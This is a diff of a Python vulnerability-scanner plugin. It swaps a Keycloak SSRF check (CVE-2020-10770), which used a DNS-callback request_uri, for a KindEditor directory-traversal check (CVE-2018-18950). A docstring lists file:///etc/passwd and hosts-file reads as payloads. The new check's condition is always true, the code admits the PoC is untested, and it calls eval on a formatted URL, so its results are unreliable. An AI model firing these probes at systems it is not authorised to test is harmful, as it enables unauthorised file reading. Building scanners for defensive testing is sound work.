@@ -1,12 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-''' 该POC没有经过实际环境验证(暂未找到漏洞环境, 还没测试POC准确性)
+''' 还没测试POC准确性, 默认不启用
+KindEditor是一套开源的HTML可视化编辑器
+    Kindeditor扫描类: 
+        Kindeditor 目录遍历
+            CVE-2018-18950
+                Payload: https://baizesec.github.io/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/Kindeditor/KindEditor%203.4.2%263.5.5%E5%88%97%E7%9B%AE%E5%BD%95%E6%BC%8F%E6%B4%9E/
 
-    Keycloak扫描类: 
-        Keycloak SSRF
-            CVE-2020-10770
-                Payload: Awvs scanner
+file:///etc/passwd
+file:///C:\Windows\System32\drivers\etc\hosts
 '''
 
 from lib.api.dns import dns
@@ -18,42 +21,41 @@ from lib.tool import check
 from thirdparty import requests
 from time import sleep
 
-class Keycloak():
+class Kindeditor():
     def __init__(self):
         self.timeout = config.get('timeout')
         self.headers = config.get('headers')
         self.proxies = config.get('proxies')
 
-        self.app_name = 'Keycloak'
+        self.app_name = 'Kindeditor'
         self.md = md5(self.app_name)
+        self.cmd = 'echo ' + self.md
 
-        self.cve_2020_10770_payloads = [
+        self.cve_2018_18950_payloads = [
             {
-                'path': 'auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=dnsdomain',
+                'path': 'php/file_manager_json.php?path=/',
                 'data': ''
-            }
+            },
         ]
 
-    def cve_2020_10770_scan(self, url):
-        ''' 强制目标服务器使用OIDC参数请求request_uri调用未经验证的URL '''
-        sessid = '4a397cf8261c330c8e8c8f584b1b647a'
+    def cve_2018_18950_scan(self, url):
+        ''' KindEditor 3.4.2/3.5.5版本中的php/file_manager_json.php文件存在目录遍历漏洞, 
+            远程攻击者可借助"path"参数利用该漏洞浏览文件
+        '''
         vul_info = {}
         vul_info['app_name'] = self.app_name
-        vul_info['vul_type'] = 'SSRF'
-        vul_info['vul_id'] = 'CVE-2020-10770'
+        vul_info['vul_type'] = 'FIle-Read'
+        vul_info['vul_id'] = 'CVE-2018-18950'
         vul_info['vul_method'] = 'GET'
         vul_info['headers'] = {}
 
-        # headers = self.headers
+        # headers = self.headers.copy()
         # headers.update(vul_info['headers'])
 
-        for payload in self.cve_2020_10770_payloads:                # * Payload
-            md = random_md5()                                       # * 随机md5值, 8位
-            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
-
-            path = payload['path'].replace('dnsdomain', dns_domain) # * Path
-            data = payload['data']                                  # * Data
-            target = url + path                                     # * Target
+        for payload in self.cve_2018_18950_payloads:
+            path = payload['path']
+            data = payload['data']
+            target = url + path
 
             vul_info['path'] = path
             vul_info['data'] = data
@@ -63,10 +65,11 @@ class Keycloak():
                 res = requests.get(
                     target, 
                     timeout=self.timeout, 
-                    headers=self.headers, 
-                    data=data,
+                    headers=self.headers,
+                    data=data, 
                     proxies=self.proxies, 
-                    verify=False
+                    verify=False,
+                    allow_redirects=False
                 )
                 logger.logging(vul_info, res.status_code, res)                        # * LOG
             except requests.ConnectTimeout:
@@ -77,10 +80,9 @@ class Keycloak():
                 return None
             except:
                 logger.logging(vul_info, 'Error')
-                return None            
+                return None
 
-            sleep(2)                                                # * dns查询可能较慢, 等一会
-            if ((res.status_code == 400) and (md in dns.result(md, sessid))):
+            if ('11'):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
@@ -97,7 +99,7 @@ class Keycloak():
             return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
 
         return [
-            thread(target=self.cve_2020_10770_scan, url=url)
+            thread(target=self.cve_2018_18950_scan, url=url)
         ]
 
-keycloak = Keycloak()
+kindeditor = Kindeditor()
